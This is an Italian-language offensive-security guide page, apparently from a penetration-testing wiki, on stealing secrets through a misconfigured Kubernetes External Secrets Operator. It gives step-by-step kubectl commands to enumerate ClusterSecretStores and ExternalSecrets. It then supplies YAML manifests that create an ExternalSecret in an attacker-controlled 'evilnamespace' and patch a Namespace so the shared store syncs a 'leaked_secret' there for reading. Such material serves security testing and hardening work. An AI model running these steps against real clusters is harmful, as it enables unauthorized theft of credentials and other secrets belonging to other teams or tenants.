# External Secret Operator

**L'autore originale di questa pagina è** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Questa pagina fornisce alcuni suggerimenti su come puoi rubare segreti da un ESO mal configurato o da un'applicazione che utilizza ESO per sincronizzare i suoi segreti.

## Disclaimer

La tecnica mostrata di seguito può funzionare solo quando sono soddisfatte determinate circostanze. Ad esempio, dipende dai requisiti necessari per consentire a un segreto di essere sincronizzato in uno spazio dei nomi che possiedi / hai compromesso. Devi scoprirlo da solo.

## Prerequisites

1. Un accesso a un cluster kubernetes / openshift con privilegi di amministratore su uno spazio dei nomi
2. Accesso in lettura su almeno ExternalSecret a livello di cluster
3. Scoprire se ci sono etichette / annotazioni o appartenenza a gruppi richieste che consentono a ESO di sincronizzare il tuo segreto. Se sei fortunato, puoi rubare liberamente qualsiasi segreto definito.

### Gathering information about existing ClusterSecretStore

Assumendo che tu abbia un utente con diritti sufficienti per leggere questa risorsa; inizia elencando prima i _**ClusterSecretStores**_ esistenti.
```sh
kubectl get ClusterSecretStore
```
### Enumerazione di ExternalSecret

Supponiamo di aver trovato un ClusterSecretStore chiamato _**mystore**_. Continua enumerando il suo externalsecret associato.
```sh
kubectl get externalsecret -A | grep mystore
```
_Questa risorsa è limitata a uno spazio dei nomi, quindi a meno che tu non sappia già quale spazio dei nomi cercare, aggiungi l'opzione -A per cercare in tutti gli spazi dei nomi._

Dovresti ottenere un elenco di externalsecret definiti. Supponiamo che tu abbia trovato un oggetto externalsecret chiamato _**mysecret**_ definito e utilizzato dallo spazio dei nomi _**mynamespace**_. Raccogli un po' più di informazioni su che tipo di segreto contiene.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Assemblare i pezzi

Da qui puoi ottenere il nome di uno o più nomi segreti (come definito nella risorsa Secret). Otterrai un output simile a:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Finora abbiamo:

- Nome di un ClusterSecretStore
- Nome di un ExternalSecret
- Nome del segreto

Ora che abbiamo tutto ciò di cui abbiamo bisogno, puoi creare un ExternalSecret (e eventualmente patchare/creare un nuovo Namespace per soddisfare i requisiti necessari per sincronizzare il tuo nuovo segreto):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Dopo alcuni minuti, se le condizioni di sincronizzazione sono state soddisfatte, dovresti essere in grado di visualizzare il segreto leakato all'interno del tuo namespace.
```sh
kubectl get secret leaked_secret -o yaml
```
## Riferimenti

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
